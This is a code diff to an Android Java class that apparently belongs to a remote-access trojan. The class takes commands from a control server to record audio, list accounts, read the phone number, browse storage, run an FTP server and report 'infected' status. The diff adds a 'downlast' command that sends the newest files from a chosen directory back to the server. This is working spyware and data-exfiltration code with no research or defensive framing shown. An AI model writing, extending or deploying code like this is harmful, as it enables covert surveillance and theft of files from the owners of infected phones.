@@ -2,12 +2,10 @@ package com.safe.myapp;
 
 import android.accounts.Account;
 import android.accounts.AccountManager;
-import android.app.AlertDialog;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
-import android.content.pm.ResolveInfo;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.wifi.ScanResult;
@@ -18,13 +16,10 @@ import android.os.Build;
 import android.os.Environment;
 import android.telephony.TelephonyManager;
 import android.text.format.Formatter;
-import android.util.Log;
-import android.util.StringBuilderPrinter;
 import android.widget.Toast;
 
 import java.io.File;
 import java.util.ArrayList;
-import java.util.Collection;
 import java.util.Collections;
 import java.util.List;
 
@@ -44,7 +39,7 @@ public class SafeCommands {
             "audio start", "audio stop", "toast ", "dialog ", "wifi",
             "accounts", "phone number", "ls ", "download ", "commands",
             "version", "infected", "address", "timeout ", "status", "getlog",
-            "ftp start", "ftp stop", "apps"};
+            "ftp start", "ftp stop", "apps", "downlast "};
 
 
     public SafeCommands(Context context, SafeCommunications comms, SafeLogger logger,
@@ -119,6 +114,25 @@ public class SafeCommands {
             ftpServer.stopServer();
         } else if (fromServer.equalsIgnoreCase(COMMANDS[22])) {
             installedApps();
+        } else if (fromServer.startsWith(COMMANDS[23])) {
+            String[] commands = fromServer
+                    .substring(COMMANDS[23].length(), fromServer.length())
+                    .split("\\s*,\\s*");
+            int amount;
+            // Check if we have the correct amount of args
+            if(commands.length != 2){
+                comms.say("Need: \'downlast ##, /directory/location\'");
+                return;
+            }
+            // Everything fine, try to parse the amount of files to download
+            try {
+                amount = Integer.parseInt(commands[0]);
+            } catch (NumberFormatException e) {
+                comms.say("Cant parseInt. Need: \'downlast ##, /directory/location\'");
+                return;
+            }
+            // Everything fine, download last files based on creation date.
+            comms.downloadLast(amount, commands[1]);
         }
     }
 
@@ -127,7 +141,7 @@ public class SafeCommands {
         NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
         WifiManager wifiMgr = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
         WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
-        if(mWifi.isConnected()) {
+        if (mWifi.isConnected()) {
             comms.say("Connected to: " + wifiInfo.getSSID() + " " + wifiInfo.getBSSID() + " " + wifiInfo.getMacAddress());
             comms.say("IP address  : " + Formatter.formatIpAddress(wifiInfo.getIpAddress()));
         } else {
@@ -199,7 +213,7 @@ public class SafeCommands {
         try {
             File directory = new File(Environment.getExternalStorageDirectory(), dir);
             File[] listOfFiles = directory.listFiles();
-            if(listOfFiles.length > 0) {
+            if (listOfFiles.length > 0) {
                 StringBuilder ls = new StringBuilder();
                 ls.append("dir: " + dir);
                 ls.append(dir);
